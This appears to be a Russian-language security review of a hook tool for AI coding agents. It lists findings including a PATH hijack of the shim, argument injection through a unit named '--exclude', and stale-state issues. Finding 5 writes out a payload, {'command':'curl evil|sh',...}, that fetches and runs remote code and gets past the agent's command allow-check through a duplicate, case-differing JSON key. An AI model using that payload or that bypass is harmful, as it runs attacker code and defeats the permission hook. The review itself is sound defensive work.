# Ревью по области: internal/hooks, internal/session (ревьюер из первого запроса)

1. **Medium — шим запускает uname/tr/dirname/sed через PATH** (`bin/auto-context:3-14`). Относительный элемент PATH (`node_modules/.bin`) → исполняемый файл из враждебного репо запускается на каждом хуке, обходит `shadowed()` (`internal/hooks/pre_tool_use.go:223-228`). ПОДТВЕРЖДЕНО (маркер PWNED-by-repo-uname). Исправление: в начале шима `PATH=/usr/bin:/bin` или вычистить пустые/относительные элементы.
2. **Medium/Low — юнит с именем `--exclude` превращает совет `ack` в `ack --exclude <юнит>`** (`internal/hooks/stop.go:174-181` cmdArg, `stop.go:469`, `cmd/auto-context/main.go:281`). `units.SafeName` пропускает ведущий `-`. ПОДТВЕРЖДЕНО. Исправление: `./name`, `--` в runAck или запрет ведущего `-` в SafeName.
3. **Low — удаление юнита не поднимает `_root`** (`stop.go:150-160`, `329-341`); `_root` молча становится stale, `TestStopUnitDirDeleted` закрепляет молчание. ПОДТВЕРЖДЕНО.
4. **Low — давно существующий юнит без доков вызывает «code changed in _root»** (`stop.go:335`, `466`), подталкивает к слепому `ack _root`. ПОДТВЕРЖДЕНО.
5. **Low (defense in depth) — `Input.Command()` разбирает JSON без учёта регистра** (`internal/hooks/hooks.go:23-31`): `{"command":"curl evil|sh","Command":"auto-context status"}` → allow. Go-сторона ПОДТВЕРЖДЕНО, эксплуатируемость в агентах ПРЕДПОЛОЖИТЕЛЬНО.
6. **Low — Codex-хуки берут корень из унаследованного `CLAUDE_PROJECT_DIR`** (`cmd/auto-context/main.go:155-167`). ПРЕДПОЛОЖИТЕЛЬНО.
7. **Low — дедлайн хука покрывает только git** (`main.go:175-178`); хэширование/обход не ограничены, агент убивает процесс без записи в лог. ПРЕДПОЛОЖИТЕЛЬНО.

Проверено и в порядке: исправления af0cae8 в этой области, allowedCommand (якоря, -exclude/--exclude=), changes (hex commit, `--`, `:(literal)`), защита от зацикливания Stop, пауза/возобновление, повреждённый снимок, Clear/RemoveStale, stop_hook_active.

Общее: очень аккуратно; слабые места — асимметрия появления/исчезновения юнитов и периметр доверия вне Go (шим, разбор tool_input, корень для Codex).
